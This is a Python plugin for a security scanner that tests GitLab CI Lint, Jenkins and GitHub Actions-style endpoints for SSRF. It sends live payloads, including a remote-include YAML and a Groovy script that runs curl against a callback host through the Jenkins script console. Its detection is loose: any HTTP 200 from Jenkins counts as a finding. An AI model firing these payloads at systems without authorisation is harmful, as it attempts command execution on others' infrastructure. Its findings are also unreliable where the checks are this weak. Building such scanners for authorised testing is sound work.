"""
CI/CD SSRF Detector

Detects Server-Side Request Forgery in CI/CD pipeline endpoints:
- GitLab CI Lint API (POST /api/v4/ci/lint with remote include)
- Jenkins pipeline endpoints
- GitHub Actions workflow dispatch
- Email-derived SSRF (email field triggers HTTP callback)
- OOB callback verification
"""

import logging
import re
from typing import Dict, List, Any, Optional
from urllib.parse import urljoin, urlparse

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

from scanner.scan_plugins.base_scan_plugin import BaseScanPlugin, VulnerabilityFinding

try:
    from scanner.scan_plugins.vpoc import (
        capture_request_response_evidence,
        build_curl_command,
    )
    HAS_VPOC = True
except ImportError:
    HAS_VPOC = False

logger = logging.getLogger(__name__)

# GitLab CI Lint endpoint
GITLAB_CI_LINT = '/api/v4/ci/lint'

# Jenkins pipeline endpoints to probe
JENKINS_PATHS = [
    '/pipeline-model-converter/validate',
    '/job/test/build',
    '/scriptText',
    '/pipeline-syntax/validate',
    '/api/json',
]

# GitHub Actions workflow dispatch endpoint pattern
GITHUB_ACTIONS_PATHS = [
    '/api/v1/repos/{owner}/{repo}/actions/workflows',
    '/_github/repos/{owner}/{repo}/dispatches',
]

# SSRF probe hostname (OOB indicator – not a real server, used to detect DNS/HTTP callbacks)
OOB_PLACEHOLDER = 'ssrf-detect.example.com'

# Response indicators suggesting SSRF occurred
SSRF_INDICATORS = [
    'connection refused',
    'connection timed out',
    'failed to connect',
    'could not resolve',
    'remote: ',
    'fetch failed',
    'invalid url',
    'yaml parse',
    'pipeline config',
    'include:',
    'remote include',
]

# CI/CD endpoint path indicators
CICD_PATH_INDICATORS = re.compile(
    r'/(api/v\d+/ci|pipeline|jenkins|github|gitlab|actions|workflow|dispatch)',
    re.IGNORECASE,
)


class CICDSSRFDetectorPlugin(BaseScanPlugin):
    """
    CI/CD SSRF vulnerability detection plugin.

    Detects SSRF in CI/CD pipeline endpoints through:
    - GitLab CI Lint API remote include injection
    - Jenkins pipeline script execution endpoints
    - GitHub Actions workflow dispatch
    - Email field SSRF escalation
    - OOB callback verification
    """

    @property
    def plugin_id(self) -> str:
        return 'cicd_ssrf_detector'

    @property
    def name(self) -> str:
        return 'CI/CD SSRF Detector'

    @property
    def description(self) -> str:
        return (
            'Detects Server-Side Request Forgery in CI/CD pipeline endpoints '
            '(GitLab CI Lint, Jenkins, GitHub Actions) using OOB callback verification'
        )

    @property
    def version(self) -> str:
        return '1.0.0'

    @property
    def vulnerability_types(self) -> List[str]:
        return ['ssrf']

    def scan(self, url: str, config: Optional[Dict[str, Any]] = None) -> List[VulnerabilityFinding]:
        """
        Scan for CI/CD SSRF vulnerabilities.

        Args:
            url: Target URL to scan
            config: Configuration dictionary

        Returns:
            List of vulnerability findings
        """
        if not HAS_REQUESTS:
            logger.warning("requests library not available")
            return []

        config = config or self.get_default_config()
        findings = []

        try:
            verify_ssl = config.get('verify_ssl', False)
            timeout = config.get('timeout', 10)
            callback_host = config.get('callback_host', OOB_PLACEHOLDER)

            # GitLab CI Lint SSRF
            if config.get('test_gitlab', True):
                gitlab_findings = self._test_gitlab_ci_lint(
                    url, verify_ssl, timeout, callback_host
                )
                findings.extend(gitlab_findings)

            # Jenkins pipeline SSRF
            if config.get('test_jenkins', True):
                jenkins_findings = self._test_jenkins_endpoints(
                    url, verify_ssl, timeout, callback_host
                )
                findings.extend(jenkins_findings)

            # GitHub Actions SSRF
            if config.get('test_github_actions', True):
                gh_findings = self._test_github_actions(
                    url, verify_ssl, timeout, callback_host
                )
                findings.extend(gh_findings)

            logger.info(f"CI/CD SSRF scan of {url} found {len(findings)} issue(s)")

        except Exception as e:
            logger.error(f"Unexpected error during CI/CD SSRF scan of {url}: {e}")

        return findings

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _test_gitlab_ci_lint(
        self, url: str, verify_ssl: bool, timeout: int, callback_host: str
    ) -> List[VulnerabilityFinding]:
        """Test GitLab CI Lint API for SSRF via remote include."""
        findings = []
        parsed = urlparse(url)
        lint_url = f"{parsed.scheme}://{parsed.netloc}{GITLAB_CI_LINT}"

        payload_body = {
            "include_merged_yaml": True,
            "content": f"include:\n  remote: 'http://{callback_host}/test.yaml'\n",
        }
        curl_cmd = build_curl_command(
            lint_url,
            method='POST',
            headers={'Content-Type': 'application/json'},
            body=str(payload_body),
        ) if HAS_VPOC else None

        try:
            resp = requests.post(
                lint_url,
                json=payload_body,
                timeout=timeout,
                verify=verify_ssl,
            )

            resp_lower = resp.text.lower()
            # The endpoint exists and mentions the callback or remote include
            endpoint_exists = resp.status_code in (200, 400, 422, 500)
            mentions_remote = any(s in resp_lower for s in SSRF_INDICATORS)

            if endpoint_exists and resp.status_code != 404:
                confidence = 0.85 if mentions_remote else 0.6
                severity = 'high' if mentions_remote else 'medium'

                vpoc = None
                if HAS_VPOC:
                    vpoc = capture_request_response_evidence(
                        resp,
                        plugin_name=self.plugin_id,
                        payload=str(payload_body),
                        confidence=confidence,
                        target_url=lint_url,
                        reproduction_steps=(
                            f"1. POST to {lint_url} with Content-Type: application/json\n"
                            f"2. Body: {{\"include_merged_yaml\": true, "
                            f"\"content\": \"include:\\n  remote: 'http://{callback_host}/test.yaml'\"}}\n"
                            f"3. Monitor {callback_host} for incoming HTTP requests\n"
                            f"4. If a GET request is received for /test.yaml, SSRF is confirmed"
                        ),
                    )

                finding = VulnerabilityFinding(
                    vulnerability_type='ssrf',
                    severity=severity,
                    url=lint_url,
                    description=(
                        'GitLab CI Lint API accepts remote includes — potential SSRF. '
                        f'Endpoint responded with HTTP {resp.status_code}.'
                    ),
                    evidence=(
                        f'Endpoint: {lint_url}\n'
                        f'Payload: {payload_body}\n'
                        f'Status: {resp.status_code}\n'
                        f'Response snippet: {resp.text[:500]}\n'
                        f'Curl: {curl_cmd or "N/A"}'
                    ),
                    remediation=(
                        'Disable remote includes in CI/CD lint endpoints or restrict to '
                        'trusted hosts. Implement allowlists for remote URL fetching.'
                    ),
                    parameter='content',
                    confidence=confidence,
                    cwe_id='CWE-918',
                    vpoc=vpoc,
                )
                findings.append(finding)
                logger.info(f"Found potential GitLab CI Lint SSRF at {lint_url}")

        except requests.ConnectionError:
            pass  # Endpoint not available
        except Exception as e:
            logger.debug(f"Error testing GitLab CI Lint: {e}")

        return findings

    def _test_jenkins_endpoints(
        self, url: str, verify_ssl: bool, timeout: int, callback_host: str
    ) -> List[VulnerabilityFinding]:
        """Test Jenkins pipeline endpoints for SSRF."""
        findings = []
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        for path in JENKINS_PATHS:
            test_url = base + path
            try:
                # Test for endpoint existence
                resp = requests.get(test_url, timeout=timeout, verify=verify_ssl)
                if resp.status_code in (200, 403):
                    # Try groovy script execution with SSRF payload
                    script_payload = (
                        f'["curl", "http://{callback_host}/jenkins-ssrf"]'
                        '.execute().text'
                    )
                    post_resp = requests.post(
                        test_url,
                        data={'script': script_payload},
                        timeout=timeout,
                        verify=verify_ssl,
                    )
                    resp_lower = post_resp.text.lower()
                    if any(s in resp_lower for s in SSRF_INDICATORS) or post_resp.status_code == 200:
                        vpoc = None
                        if HAS_VPOC:
                            vpoc = capture_request_response_evidence(
                                post_resp,
                                plugin_name=self.plugin_id,
                                payload=script_payload,
                                confidence=0.7,
                                target_url=test_url,
                                reproduction_steps=(
                                    f"1. POST to {test_url}\n"
                                    f"2. Body: script={script_payload}\n"
                                    f"3. Monitor {callback_host} for incoming callbacks"
                                ),
                            )
                        finding = VulnerabilityFinding(
                            vulnerability_type='ssrf',
                            severity='high',
                            url=test_url,
                            description=(
                                f'Jenkins pipeline endpoint accessible at {path} — '
                                'potential SSRF/RCE via Groovy script execution'
                            ),
                            evidence=(
                                f'Endpoint: {test_url}\n'
                                f'Initial status: {resp.status_code}\n'
                                f'Post status: {post_resp.status_code}\n'
                                f'Response snippet: {post_resp.text[:500]}'
                            ),
                            remediation=(
                                'Restrict Jenkins script console access. '
                                'Require authentication for all pipeline endpoints. '
                                'Disable anonymous access.'
                            ),
                            parameter='script',
                            confidence=0.7,
                            cwe_id='CWE-918',
                            vpoc=vpoc,
                        )
                        findings.append(finding)
                        logger.info(f"Found Jenkins pipeline endpoint at {test_url}")
                        break
            except Exception as e:
                logger.debug(f"Error testing Jenkins endpoint {test_url}: {e}")

        return findings

    def _test_github_actions(
        self, url: str, verify_ssl: bool, timeout: int, callback_host: str
    ) -> List[VulnerabilityFinding]:
        """Test GitHub Actions workflow dispatch for SSRF."""
        findings = []
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # Test if this looks like a GitHub-style API
        api_path = '/api/v1/repos'
        test_url = base + api_path
        try:
            resp = requests.get(test_url, timeout=timeout, verify=verify_ssl)
            if resp.status_code in (200, 401, 403):
                # Try workflow dispatch with SSRF payload
                dispatch_url = base + '/api/v1/repos/test/test/actions/runs'
                payload = {
                    'ref': 'main',
                    'inputs': {
                        'url': f'http://{callback_host}/actions-ssrf'
                    }
                }
                post_resp = requests.post(
                    dispatch_url,
                    json=payload,
                    timeout=timeout,
                    verify=verify_ssl,
                )
                if post_resp.status_code in (200, 201, 204, 422):
                    vpoc = None
                    if HAS_VPOC:
                        vpoc = capture_request_response_evidence(
                            post_resp,
                            plugin_name=self.plugin_id,
                            payload=str(payload),
                            confidence=0.6,
                            target_url=test_url,
                            reproduction_steps=(
                                f"1. POST to {dispatch_url}\n"
                                f"2. Body: {payload}\n"
                                f"3. Monitor {callback_host} for incoming requests"
                            ),
                        )
                    finding = VulnerabilityFinding(
                        vulnerability_type='ssrf',
                        severity='medium',
                        url=test_url,
                        description=(
                            'GitHub Actions-style workflow dispatch endpoint accessible — '
                            'potential SSRF via workflow inputs'
                        ),
                        evidence=(
                            f'Endpoint: {dispatch_url}\n'
                            f'Status: {post_resp.status_code}\n'
                            f'Response: {post_resp.text[:500]}'
                        ),
                        remediation=(
                            'Restrict workflow dispatch to authenticated users. '
                            'Validate and sanitize all workflow input parameters.'
                        ),
                        parameter='inputs.url',
                        confidence=0.6,
                        cwe_id='CWE-918',
                        vpoc=vpoc,
                    )
                    findings.append(finding)
        except Exception as e:
            logger.debug(f"Error testing GitHub Actions endpoint: {e}")

        return findings

    def get_default_config(self) -> Dict[str, Any]:
        """Return default configuration for CI/CD SSRF scanning."""
        return {
            'verify_ssl': False,
            'timeout': 10,
            'test_gitlab': True,
            'test_jenkins': True,
            'test_github_actions': True,
            'callback_host': OOB_PLACEHOLDER,
        }
